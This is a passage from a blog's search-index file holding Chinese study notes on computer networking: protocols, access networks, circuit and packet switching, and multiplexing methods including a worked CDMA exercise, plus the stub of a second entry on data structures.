systems)通信链路：光纤、铜缆、无线电、卫星......分组交换：转发分组(数据包)    路由器和交换机</code></pre></div><ul><li><p>Internet服务角度</p><p>为网络应用提供通信服务的通信基础设施：Web、VoIP、email、网络游戏、电子商务…</p><p>为网络应用提供编程接口（API）：支持应用程序“连接”Internet,发送/接收数据；提供数据传输服务…</p><p>然鹅，仅有硬件（主机、通信链路、路由器…）连接，Internet是无法顺畅运行的（无法保证应用数据有序交付），因此<strong>协议</strong></p><h3 id="什么是网络协议？"><a href="#什么是网络协议？" class="headerlink" title="什么是网络协议？"></a>什么是网络协议？</h3><p>网络协议主要是为了让网络资源物尽其用。</p></li><li><p>协议是计算机网络有序运行的重要保证</p><ul><li><p>硬件</p></li><li><p>计算机网络中的数据交换必须遵守事先约定好的<strong>规则</strong></p></li></ul><p>网络协议(network protocol)，简称<strong>协议</strong>，是为进行网络中的数据交换而建立的规则、标准。</p><p>协议规定了通信实体之间所交换消息的<strong>格式、意义、排序</strong>以及针对收到信息或发生事件所采取的“动作”。</p></li></ul><ul><li><p>协议的三要素</p><ul><li><p>语法(Syntax)</p><p>数据与控制信息的结构或格式</p><p>信号电平(底层信息)</p></li><li><p>语义(Semantics)</p><p>需要发出何种控制信息</p><p>完成何种动作以及做出何种响应</p><p>差错控制</p></li><li><p>时序(Timing)</p><p>事件顺序</p><p>速度匹配</p></li></ul></li></ul><ul><li><p>协议是计算机网络的重要内容</p><ul><li><p>协议规范了网络中所有信息的发送和接收过程</p><p>eg: TCP , IP , HTTP , Skype , 802.11</p></li><li><p>学习网络的重要内容之一</p></li><li><p>网络创新的表现形式之一</p></li><li><p>Internet协议标准</p><ul><li>RFC：Request for Comments(权威)</li><li>IETF:互联网工程任务组(Internet Engineering Task Force)</li></ul></li></ul><h2 id="1-2-计算机网络结构"><a href="#1-2-计算机网络结构" class="headerlink" title="1.2 计算机网络结构"></a>1.2 计算机网络结构</h2></li></ul><h3 id="计算机网络结构"><a href="#计算机网络结构" class="headerlink" title="计算机网络结构"></a>计算机网络结构</h3><h5 id="网络边缘"><a href="#网络边缘" class="headerlink" title="网络边缘"></a>网络边缘</h5><ul><li><p>主机</p><ul><li>位于“网络边缘”</li><li>运行网络应用程序，例如：web，email</li></ul></li><li><p>网络应用</p><ul><li><p>客户/服务器（client/server）应用模型</p><p>客户发送请求，接收服务器响应，如：Web应用，文件传输FTP应用</p></li><li><p>对等(peer-peer,P2P)应用模型</p><p>无(或不仅依赖)专用服务器</p><p>通信在<strong>对等</strong>实体之间直接进行</p><p>如：Skype,QQ</p></li></ul></li></ul><h5 id="接入网络（物理介质）"><a href="#接入网络（物理介质）" class="headerlink" title="接入网络（物理介质）"></a>接入网络（物理介质）</h5><ul><li><p>有线或无线通信链路</p><p>接入网络主要为将网络边缘接入核心网络</p><p>接入网络分为：住宅/家庭接入网络；机构接入网络（学校企业等）；移动接入网络</p><p>用户关心的是：带宽(bandwidth，bps) ；独占/共享？</p></li></ul><p>  举个栗子：</p><ul><li><p>栗子一，接入网络：数字用户线路（DSL）</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705191649867.png" srcset="/img/loading.gif" lazyload="" width="50%"></center></li></ul><ol><li>家庭用户利用<strong>已有的</strong>电话线连接中心局的DSLAM（数据通过DSL电话线接入Internet,语音/电话通过DSL电话线接入电话网）</li><li>&lt;2.5Mbps上行传输速率(典型速率&lt;1Mbps)   ~上传速度</li><li>&lt;24Mbps 下行传输速率(典型速率&lt;1Mbps)   ~下载速度</li><li>FDM(利用不同的频带传输)：50 kHz- 1MHz用于下行；4 kHz- 50kHz用于上行；0 kHz- 4kHz用于传统通话；</li></ol><ul><li><p>栗子二，接入网络：电缆网络</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192154360.png" srcset="/img/loading.gif" lazyload="" width="50%"></center>FDM频分多路复用：在不同频带(载波)上传输不同频道<p>HFC：混合光纤同轴电缆（非对称，下行高达30Mbps传输速率，上行2Mbps传输速率）</p></li></ul><p>各家庭设备通过电缆网络→光纤接入ISP路由器（各家庭<strong>共享</strong>家庭至电缆头端的接入网络；不同DSL的<strong>独占</strong>至中心局的接入）</p><ul><li><p>栗子三，接入网络：典型家庭网络的接入</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192228414.png" srcset="/img/loading.gif" lazyload="" width="50%"></center></li><li><p>栗子四，接入网络：机构(企业)接入网络</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192307888.png" srcset="/img/loading.gif" lazyload="" width="50%"></center>  主要用于公司、高校等组织机构    (个人或家庭也可以用)</li></ul><p>典型传输速率：10Mbps,100Mbps,1Gbps,10Gbps    </p><p>目前，端系统通常直接连接以太网交换机(switch)</p><ul><li><p>栗子五，交换网络：无线接入网络</p><p>通过<strong>共享</strong>接入网络连接端系统与路由器 【通过”基站 （base station）”或称为”接入点 （access point）”】</p><p>例如，<strong>无线局域网(LANs)</strong></p><ul><li>同一建筑物内(30m)</li><li>802.11b/g(WiFi):11Mbps\54Mbps传输速率</li></ul><p>例如，<strong>广域无线接入</strong></p><ul><li>通过电信运营商（蜂窝网），接入范围几十公里</li><li>带宽：1Mbps、10Mbps、100Mbps</li><li>移动互联网</li></ul></li></ul><h5 id="网络核心（核心网络）"><a href="#网络核心（核心网络）" class="headerlink" title="网络核心（核心网络）"></a>网络核心（核心网络）</h5><ul><li><p>互联的路由器（或分组转发设备）</p></li><li><p>网络之网络</p></li></ul><p>网络核心的关键功能是：<strong>路由</strong>+<strong>转发</strong></p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192401433.png" srcset="/img/loading.gif" lazyload="" width="50%"></center>网络核心解决的基本问题是：用**数据交换**的方法实现数据源主机通过网络核心送达目的主机<h3 id="Internet结构"><a href="#Internet结构" class="headerlink" title="Internet结构"></a>Internet结构</h3><p>端系统通过<strong>接入ISP（access ISPs）</strong>连接到Internet，例如家庭、公司和大学ISPs</p><p>接入ISP必须进一步互联（这样任意两个主机才可以互相发送分组）</p><p>构成复杂的网络互连的网络（经济和国家政策是网络演进的主要驱动力）</p><p>当前Internet结构无人能给出精确描述</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705192518036.png" srcset="/img/loading.gif" lazyload="" alt="数以百万计的ISP互连"></p><h2 id="1-3-网络核心"><a href="#1-3-网络核心" class="headerlink" title="1.3 网络核心"></a>1.3 网络核心</h2><h4 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h4><p>考虑：$N^2$链路问题，连通性，网络规模</p><p>交换的含义：1.动态转接；2.<strong>动态分配传输资源</strong>；</p><p>数据交换的类型：    </p><ol><li>电路交换</li><li>报文交换</li><li>分组交换</li></ol><ul><li><p>电路交换的特点</p><ul><li>最典型的交换网络：电话网络</li></ul><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200705235934426.png" srcset="/img/loading.gif" lazyload="" width="50%"></center></li><li><p>电路交换的三个阶段:</p><ol><li>建立连接（呼叫/电路建立）</li><li>通信</li><li>释放连接（拆除电路）</li></ol></li><li><p><strong>独占资源</strong>（释放连接之后电路资源才可被第三方占有）</p><p>【然而电路交换网络中，每条电路<strong>不是</strong>独占其经过的物理链路的，至于电路交换网络如何实现<strong>链路共享</strong>，这又扯到<strong>多路复用</strong>】 </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706001014777.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li></ul><h4 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h4><p>多路复用(multiplexing)，简称<strong>复用</strong>，是通信技术中的基本概念。</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706001117993.png" srcset="/img/loading.gif" lazyload="" width="50%"></center>- 多路复用：链路/网络资源（如带宽）划分为“资源片”  - 将资源片分配给各路“呼叫”（calls）  - 每路呼叫**独占**分配到的资源片进行通信  - 资源片可能**“闲置”**（**idle**）(无共享)- 典型多路复用方法：  - 频分多路复用（frequency divsion multiplexing，**FDM**）  - 时分多路复用（time divsion multiplexing，**TDM**）  - 时分多路复用（Wavelength divsion multiplexing，**WDM**）  - 码分多路复用（Code divsion multiplexing，**CDM**）<p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706002059008.png" srcset="/img/loading.gif" lazyload="" alt=""></p><ul><li><p>频分多路复用（FMD）</p><ul><li><p>频分多路复用的个用户占用不同的带宽资源（这的“带宽”是<strong>频率带宽（单位：Hz）</strong>而不是数据的发送速率）</p></li><li><p>用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/67b9b206b3e8c6adb9bf55a97f173c7.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li></ul></li><li><p>时分多路复用（TDM）</p><ul><li><p>时分复用则是将时间划分为一段段等长的<strong>十分复用帧</strong>（TDM帧），每个用户在每个TDM帧中占用固定序号的时隙。</p></li><li><p>每个用户所占用的时隙是<strong>周期性出现</strong>（其周期就是TDM帧的长度）。</p></li><li><p>时分复用的所有用户是在不同的时间占用<strong>相同的</strong>频带宽度。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706003833391.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li></ul></li><li><p>波分多路复用（WDM）</p><p>WDM的实质是FDM</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706004019570.png" srcset="/img/loading.gif" lazyload="" alt="波分复用就是光的频分复用"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706004041762.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>码分多路复用（CDM）</p><p>详细码分多址（CDMA）</p><ul><li><p>广泛应用于无线链路共享（如蜂窝网，卫星通信等）</p></li><li><p>每个用户分配一个唯一 m bit<strong>码片序列</strong>（chipping sequence），其中“0”用“-1”表示、“1”用“+1”表示，例如：</p><p>S站的码片序列：（-1 -1 - 1 +1 +1 -1 +1 +1）</p></li><li><p>各用户使用<strong>相同频率</strong>载波，利用各自码片序列编码数据</p></li><li><p>编码信号=（原始数据）$\times$ (码片序列)</p><p>如发送比特 1 （+1），则发送自己的m bit 码片序列</p><p>如发送比特 0 （-1），则发送自己的m bit 码片序列的反码</p></li><li><p>各用户序列相互正交（orthogonal）</p><p>$$<br>\frac{1}{m} S_0 \cdot S_j = \left {</p><div class="hljs code-wrapper"><pre><code>    \begin{aligned}   1, i=j          \\\\0, i \not = j   \end{aligned}        \right.  \\\\        \frac{1}{m} S_0 \cdot S_j = \left \{    \begin{aligned}      -1, i=j    \\\\      0, i \not = j \end{aligned} \right.</code></pre></div><p>$$</p><p>此用于判断是否为用户自己的码片序列，令$d_i$为原始数据序列，各用户的叠加向量为：</p></li></ul><p>$$<br>P = \sum_{i=1}^N d_i \cdot S_i = \sum_{i=1}^N  \overset{(-)} S_i<br>$$</p></li></ul><p>​    </p><ul><li><strong>解码</strong>：码片序列与编码信号的<strong>内积</strong><br>$$<br>\frac{1}{m} S_i \cdot P = \left {    \begin{aligned}    &amp;1,    &amp; S_i \in j \    &amp;-1,&amp;  \overset{-} S_i \in P    \    &amp;0,    &amp;    S_i,\overset{-} S_i \not \in P  \end{aligned}    \right.<br>$$</li></ul><p>​    </p><p>​    <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706010859310.png" srcset="/img/loading.gif" lazyload="" alt="单个用户"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706010939848.png" srcset="/img/loading.gif" lazyload="" alt="多个用户"></p><blockquote><p>例题：站点A、B、C通过CDMA共享链路，A、B、C的码片序列（chipping sequence）分别是（1,1,1,1）、（1，-1,1，-1）和（1，1,-1，-1），若C从链路上收到的序列是（2,0,2,0,0，-2,0，-2,0,2,0,2），则C收到A发送的数据是 （）</p><p>A.000</p><p>B.101</p><p>C.110</p><p>D.111</p><p>正确答案是 B</p><p>C接收到的是A，B发送过来的叠加码片，C想要看A发送的数据，就将接收到的叠加码片与A的码片序列进行规格化内积操作：（2，0，2，0；0，-2，0，-2；0，2，0，2）每四位与（1，1，1，1）进行规格化内积，（2 * 1+0 * 1+2 * 1+0 * 1)/4=1;（0 * 1+2 * 1+0 * 1+2 * 1)/4=-1，-1即0;（0 * 1+2 * 1+0 * 1+2 * 1)/4=1;可以得到结果101</p></blockquote><h4 id="报文交换与分组交换"><a href="#报文交换与分组交换" class="headerlink" title="报文交换与分组交换"></a>报文交换与分组交换</h4><ul><li><p>报文交换（message switching）</p><p>报文：源（应用）发送信息整体，比如一个文件</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064307886.png" srcset="/img/loading.gif" lazyload="" width="50%"></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064339694.png" srcset="/img/loading.gif" lazyload="" width="50%"></center></li><li><p>分组交换（package switching）</p><p>分组：报文拆出来的一系列相对较小的数据包 （由头+数据包构成）</p></li></ul>  <center><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="54" height="20"><linearGradient id="s" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"></stop><stop offset="1" stop-opacity=".1"></stop></linearGradient><clipPath id="r"><rect width="54" height="20" rx="3" fill="#fff"></rect></clipPath><g clip-path="url(#r)"><rect width="21" height="20" fill="#555"></rect><rect x="21" width="33" height="20" fill="#4c1"></rect><rect width="54" height="20" fill="url(#s)"></rect></g><g fill="#fff" text-anchor="middle" font-family="Verdana,Geneva,DejaVu Sans,sans-serif" text-rendering="geometricPrecision" font-size="110"><text x="115" y="150" fill="#010101" fill-opacity=".3" transform="scale(.1)" textLength="110">头</text><text x="115" y="140" transform="scale(.1)" textLength="110">头</text><text x="365" y="150" fill="#010101" fill-opacity=".3" transform="scale(.1)" textLength="230">数据</text><text x="365" y="140" transform="scale(.1)" textLength="230">数据</text></g></svg></center>分组交换需要报文的**拆分**与**重组**<p>  产生<strong>额外开销</strong></p>  <center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064427056.png" srcset="/img/loading.gif" lazyload="" width="50%"></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064516951.png" srcset="/img/loading.gif" lazyload="" width="50%"></center>  <center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064601183.png" srcset="/img/loading.gif" lazyload="" width="50%"></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706064719009.png" srcset="/img/loading.gif" lazyload="" width="50%"></center>![分组交换：统计多路复用](https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706073211102.png)<p>A&amp;B分组序列不确定（不是事先分配好的），按需共享链路（A与B总共带宽是1.5Mb/s）</p><p>【PS:  “Mbps”，其全称为Million bits per second，意为每秒传输百万位（比特） ， <strong>Mbps=Mb/s</strong> ；MB表示Million Bytes（百万字节） 。】</p><ul><li><p>存储转发 （store-and-forward） </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200706073844184.png" srcset="/img/loading.gif" lazyload="" alt="image-20200706073844184"></p><ul><li><p>报文交换与分组交换均采用存储-转发交换方式（区别：报文交换以完整报文进行“存储-转发”）</p></li><li><p>分组交换以较小的分组进行“存储-转发” </p></li></ul></li></ul><p>  哪种交换好呢？</p><ul><li><p>分组交换：传输延迟</p><p>发送主机：</p><ul><li><p>接收应用报文（消息）</p></li><li><p>拆分为较小长度为<strong>L</strong></p></li><li><p>在传输速率为<strong>R</strong>的链路上传输妇分组<br>$$<br>分组传输延迟(时延delay)= \frac{L(bits)}{R(bits/sec)}<br>$$</p></li></ul></li></ul><ul><li><p>报文交换VS分组交换</p><ul><li><p>报文交换</p><p>报文长度为 <strong>M</strong> bits</p><p>链路带宽为 <strong>R</strong> bps</p><p>每次传输报文需要 <strong>M/R</strong></p></li><li><p>分组交换</p><p>报文被拆分为多个分组</p><p>分组长度为 <strong>L</strong> bits</p><p>每个分组传输时延为 <strong>L/R</strong>秒</p></li><li><p>例</p><p>M = 7.5 Mbits</p><p>L = 1500</p></li></ul></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记：数据结构（断更）</title>
      <link href="/2019/09/14/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2019/09/14/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>《数据结构》严蔚敏版+吴伟民版 学习笔记</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机理论 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
